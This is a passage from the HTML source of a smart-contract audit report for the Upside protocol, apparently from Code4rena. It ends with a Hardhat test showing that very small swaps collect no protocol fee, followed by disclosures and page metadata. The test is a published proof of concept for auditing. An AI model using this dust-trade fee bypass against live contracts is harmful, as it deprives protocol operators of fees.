class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const newFeeInfo = {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      tokenizeFeeEnabled: true,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      tokenizeFeeDestinationAddress: tokenizeFeeDestinationAddress,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeStartingBp: 100,  // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDecayBp: 100,      // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDecayInterval: 6,  // 6 seconds\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeFinalBp: 90,      // 0.9%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDeployerBp: 1000,  // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeSellBp: 100,       // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Set fee info:\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(owner).setFeeInfo(newFeeInfo);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // mint user1 with liquidityToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await liquidityToken.mint(await user1.getAddress(), _mintAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Verify user1 received the correct liquidity token balance\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let user1LiquidityTokenBalance = await liquidityToken.balanceOf(await user1.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(user1LiquidityTokenBalance).to.be.eq(_mintAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Perform a swap with an extremely small input amount\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const _tokenAmount = hhethers.parseUnits(\u0026quot;0.000099\u0026quot;, 6);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await liquidityToken.connect(user1).approve(await upsideProtocol.getAddress(), _tokenAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(user1).swap(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await sampleLinkToken.getAddress(),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      true,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      _tokenAmount,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await user1.getAddress()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // assert that user1 receives a non-zero amount of LINK tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let user1LinkTokenBalance = await sampleLinkToken.balanceOf(await user1.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(user1LinkTokenBalance).to.be.gt(0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Check that no protocol fees were collected from the swap\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let claimableProtocolFees = await upsideProtocol.claimableProtocolFees();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(claimableProtocolFees).to.be.eq(0); // Fee bypass confirmed\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cem\u003eNote: QA report issues deemed invalid by the judge have been removed for reporting purposes.\u003c/em\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 id=\"disclosures\" style=\"position:relative;\"\u003e\u003ca href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eDisclosures\u003c/h1\u003e\n\u003cp\u003eC4 is an open organization governed by participants in the community.\u003c/p\u003e\n\u003cp\u003eC4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\u003c/p\u003e\n\u003cp\u003eC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\u003c/p\u003e\n\u003cstyle class=\"grvsc-styles\"\u003e\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line \u003e * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting \u003e .grvsc-code \u003e .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n\u003c/style\u003e"])</script><script>self.__next_f.push([1,"19:{\"name\":\"Upside\",\"link\":\"https://x.com/UpsideFun\",\"imageUrl\":\"https://code4-api-v0-public-storage.s3.us-east-1.amazonaws.com/upload-Yqsfiw92mZH\"}\n1a:{\"start_time\":\"2025-05-19T20:00:00.000Z\",\"end_time\":\"2025-05-26T20:00:00.000Z\",\"bot_race_time_limit\":1}\n17:{\"uid\":\"buoDy35wJHw\",\"slug\":\"2025-05-upside\",\"title\":\"Upside\",\"sponsor\":\"Upside\",\"date\":\"2025-06-08\",\"findings\":\"https://code4rena.com/audits/2025-05-upside/submissions\",\"contest\":506,\"alt_url\":null,\"html\":\"$18\",\"toc\":\"\u003cul\u003e\\n\u003cli\u003e\\n\u003cp\u003e\u003ca href=\\\"#overview\\\"\u003eOverview\u003c/a\u003e\u003c/p\u003e\\n\u003cul\u003e\\n\u003cli\u003e\u003ca href=\\\"#about-c4\\\"\u003eAbout C4\u003c/a\u003e\u003c/li\u003e\\n\u003c/ul\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#summary\\\"\u003eSummary\u003c/a\u003e\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#scope\\\"\u003eScope\u003c/a\u003e\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#severity-criteria\\\"\u003eSeverity Criteria\u003c/a\u003e\u003c/li\u003e\\n\u003cli\u003e\\n\u003cp\u003e\u003ca href=\\\"#low-risk-and-non-critical-issues\\\"\u003eLow Risk and Non-Critical Issues\u003c/a\u003e\u003c/p\u003e\\n\u003cul\u003e\\n\u003cli\u003e\u003ca href=\\\"#01-front-running-attack-in-tokenize-function\\\"\u003e01 Front-running attack in tokenize function\u003c/a\u003e\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#02-transferring-ownership-may-result-in-fees-being-unintentionally-paid-to-the-previous-owner\\\"\u003e02 Transferring ownership may result in fees being unintentionally paid to the previous owner\u003c/a\u003e\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#03-swap-fee-bypass-via-small-trade-amounts\\\"\u003e03 Swap fee bypass via small trade amounts\u003c/a\u003e\u003c/li\u003e\\n\u003c/ul\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#disclosures\\\"\u003eDisclosures\u003c/a\u003e\u003c/li\u003e\\n\u003c/ul\u003e\",\"created_at\":\"2025-06-08T19:51:27.685Z\",\"updated_at\":\"2025-06-08T19:51:27.685Z\",\"sponsor_data\":\"$19\",\"contest_data\":\"$1a\"}\n8:[\"$\",\"$L13\",null,{\"landingPage\":[\"$\",\"$L14\",null,{\"report\":{\"uid\":\"buoDy35wJHw\",\"slug\":\"2025-05-upside\",\"title\":\"Upside\",\"sponsor\":\"Upside\",\"date\":\"2025-06-08\",\"findings\":\"https://code4rena.com/audits/2025-05-upside/submissions\",\"contest\":506,\"alt_url\":null,\"html\":\"$15\",\"toc\":\"\u003cul\u003e\\n\u003cli\u003e\\n\u003cp\u003e\u003ca href=\\\"#overview\\\"\u003eOverview\u003c/a\u003e\u003c/p\u003e\\n\u003cul\u003e\\n\u003cli\u003e\u003ca href=\\\"#about-c4\\\"\u003eAbout C4\u003c/a\u003e\u003c/li\u003e\\n\u003c/ul\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#summary\\\"\u003eSummary\u003c/a\u003e\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#scope\\\"\u003eScope\u003c/a\u003e\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#severity-criteria\\\"\u003eSeverity Criteria\u003c/a\u003e\u003c/li\u003e\\n\u003cli\u003e\\n\u003cp\u003e\u003ca href="])</script><script>self.__next_f.push([1,"\\\"#low-risk-and-non-critical-issues\\\"\u003eLow Risk and Non-Critical Issues\u003c/a\u003e\u003c/p\u003e\\n\u003cul\u003e\\n\u003cli\u003e\u003ca href=\\\"#01-front-running-attack-in-tokenize-function\\\"\u003e01 Front-running attack in tokenize function\u003c/a\u003e\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#02-transferring-ownership-may-result-in-fees-being-unintentionally-paid-to-the-previous-owner\\\"\u003e02 Transferring ownership may result in fees being unintentionally paid to the previous owner\u003c/a\u003e\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#03-swap-fee-bypass-via-small-trade-amounts\\\"\u003e03 Swap fee bypass via small trade amounts\u003c/a\u003e\u003c/li\u003e\\n\u003c/ul\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003ca href=\\\"#disclosures\\\"\u003eDisclosures\u003c/a\u003e\u003c/li\u003e\\n\u003c/ul\u003e\",\"created_at\":\"2025-06-08T19:51:27.685Z\",\"updated_at\":\"2025-06-08T19:51:27.685Z\",\"sponsor_data\":{\"name\":\"Upside\",\"link\":\"https://x.com/UpsideFun\",\"imageUrl\":\"https://code4-api-v0-public-storage.s3.us-east-1.amazonaws.com/upload-Yqsfiw92mZH\"},\"contest_data\":{\"start_time\":\"2025-05-19T20:00:00.000Z\",\"end_time\":\"2025-05-26T20:00:00.000Z\",\"bot_race_time_limit\":1}}}],\"coreAppPage\":[\"$\",\"$L16\",null,{\"report\":\"$17\"}]}]\ne:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],[\"$\",\"meta\",\"1\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"2\",{\"children\":\"Code4rena | Keeping high severity bugs out of production\"}],[\"$\",\"meta\",\"3\",{\"name\":\"description\",\"content\":\"Top auditors compete to keep high severity bugs out of production. Start a public or private audit within 48 hours.\"}],[\"$\",\"meta\",\"4\",{\"name\":\"application-name\",\"content\":\"Code4rena | Keeping high severity bugs out of production\"}],[\"$\",\"meta\",\"5\",{\"property\":\"og:title\",\"content\":\"Code4rena\"}],[\"$\",\"meta\",\"6\",{\"property\":\"og:description\",\"content\":\"Code4rena is a competitive audit platform that finds more high-severity vulnerabilities, more quickly than any other auditing method.\"}],[\"$\",\"meta\",\"7\",{\"property\":\"og:site_name\",\"content\":\"Code4rena\"}],[\"$\",\"meta\",\"8\",{\"property\":\"og:image\",\"content\":\"https://code4rena.com/images/c4/c4-og-v2.png\"}],[\"$\",\"meta\",\"9\",{\"property\":\"og:type\",\"content\":\"website\"}],[\"$\",\"meta\",\"10\",{\"name\":\"twitter:card\",\"content\":\"su"])</script><script>self.__next_f.push([1,"mmary_large_image\"}],[\"$\",\"meta\",\"11\",{\"name\":\"twitter:title\",\"content\":\"Code4rena\"}],[\"$\",\"meta\",\"12\",{\"name\":\"twitter:description\",\"content\":\"Code4rena is a competitive audit platform that finds more high-severity vulnerabilities, more quickly than any other auditing method.\"}],[\"$\",\"meta\",\"13\",{\"name\":\"twitter:image\",\"content\":\"https://code4rena.com/images/c4/c4-og-v2.png\"}],[\"$\",\"link\",\"14\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"256x256\"}],[\"$\",\"link\",\"15\",{\"rel\":\"icon\",\"href\":\"/logos/c4/c4-favicon-32.png\"}],[\"$\",\"link\",\"16\",{\"rel\":\"apple-touch-icon\",\"href\":\"/logos/c4/apple-touch-icon.png\"}],[\"$\",\"meta\",\"17\",{\"name\":\"next-size-adjust\"}]]\n7:null\n"])</script></body></html>